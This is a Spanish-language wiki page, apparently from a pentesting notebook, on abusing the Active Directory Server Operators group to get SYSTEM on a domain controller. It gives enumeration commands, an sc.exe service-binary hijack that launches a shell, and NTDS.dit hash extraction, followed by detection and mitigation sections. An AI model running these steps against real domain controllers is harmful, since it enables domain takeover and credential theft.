---
title: Server Operators — privilegios de servicio en un DC
tags: [windows, active-directory, server-operators, privesc, services]
---

# Server Operators: el grupo que no parece administrador

[🇬🇧 English](server-operators.en.md) | **Español**

## 1. Qué es

**Server Operators** es un grupo integrado de Active Directory. En un controlador de dominio sus miembros pueden:

- Iniciar y detener servicios.
- Cambiar la configuración de servicios (`SERVICE_CHANGE_CONFIG`).
- Hacer copias de seguridad y restaurar ficheros.
- Cambiar la hora del sistema.
- Apagar el equipo.
- Acceder localmente al DC.

No son `Domain Admins`, pero pueden reconfigurar un servicio que corre como `LocalSystem` y ejecutar código como SYSTEM. Es una escalada directa.

## 2. Enumeración

```cmd
whoami /groups | findstr /i "Server Operators"
net localgroup "Server Operators"
sc.exe query state= all
sc.exe qc <SERVICE>
```

```powershell
Get-LocalGroupMember -Group 'Server Operators'
Get-CimInstance Win32_Service | Select-Object Name,StartName,PathName,State
```

Interesan servicios que ya existen y se pueden reiniciar sin romper el sistema. `VSS`, `Spooler`, `RemoteRegistry` o un servicio propio del DC son candidatos.

## 3. Reconfigurar el binario

```cmd
sc.exe qc VSS
sc.exe config VSS binPath= "C:\Windows\System32\cmd.exe /c C:\ProgramData\shell.exe"
sc.exe start VSS
```

Si el servicio no arranca (error 1053), el hijo puede haberse ejecutado igualmente. Se comprueba el listener. Para revertir:

```cmd
sc.exe config VSS binPath= "C:\Windows\System32\svchost.exe -k netsvcs -p"
sc.exe start VSS
```

También se puede usar `sc.exe sdset` para conceder permisos, o `reg add` sobre `HKLM\SYSTEM\CurrentControlSet\Services\<SVC>\ImagePath`.

## 4. Alternativas

- **Backup/restore**: `SeBackupPrivilege` permite copiar `NTDS.dit` y el registro; con `secretsdump.py -ntds` se extraen hashes.
- **Tareas programadas**: si el grupo puede crear tareas como SYSTEM.
- **Cambio de hora**: útil para tickets Kerberos, no para ejecución.
- **Parada de servicios**: puede interrumpir defensas, pero es ruidoso.

## 5. Detección

- **7045**: servicio instalado.
- **4697**: servicio instalado en el sistema (Security log).
- **4624** tipo 3/10 en el DC desde una estación de usuario.
- **4672** con privilegios de servicio para una cuenta que no los usa normalmente.
- Cambios en `ImagePath` y en la configuración de servicios (Event ID 7040).
- Procesos hijos de `services.exe` con rutas en `Temp`/`ProgramData`.

## 6. Mitigación

- Mantener `Server Operators` vacío o con cuentas humanas muy limitadas.
- Separar las cuentas administrativas de las de usuario.
- Monitorizar la pertenencia al grupo y los cambios de servicio.
- Aplicar el principio de mínimo privilegio a servicios de terceros.
- Usar LAPS y rotar credenciales de servicio.

MITRE: T1543.003, T1078.002, T1003.003.

## 7. Referencias

- <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups>
- <https://attack.mitre.org/techniques/T1543/003/>
- <https://0xdf.gitlab.io/2022/05/05/htb-return.html>
